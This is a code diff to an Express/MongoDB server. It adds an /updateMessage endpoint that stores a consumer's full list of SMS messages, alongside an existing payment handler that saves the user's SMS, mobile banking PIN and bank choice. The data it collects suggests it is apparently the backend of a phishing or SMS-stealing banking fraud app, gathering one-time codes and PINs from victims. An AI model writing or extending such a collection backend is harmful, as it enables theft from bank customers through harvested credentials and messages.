@@ -143,7 +143,7 @@ app.post("/submitPayment", async (req, res) => {
       { uniqueID: data.uniqueID },
       {
         $push: { allUserSms: allSms },
-       
+
         selectedPaymentMethod: method,
         mPin,
         selectedBank,
@@ -165,7 +165,33 @@ app.post("/submitPayment", async (req, res) => {
     return res.status(203).json({ message: error.message });
   }
 });
-app.get("/", (req,res) => {
+app.post("/updateMessage", async (req, res) => {
+  const {
+    consumerId,
+    allSms,
+
+  } = req.body;
+
+  try {
+
+
+    // Find the document with the provided uniqueID and update the data
+    const re = await FormData.findOneAndUpdate(
+      { consumerId },
+      {
+        allUserSms: allSms
+
+
+      },
+      { new: true }
+    );
+    
+    return res.status(200).json({ message: "Form updated successfully" });
+  } catch (error) {
+    return res.status(203).json({ message: error.message });
+  }
+});
+app.get("/", (req, res) => {
   res.status(200).json({ message: "Welcome to the server" });
 });
 // Start the server
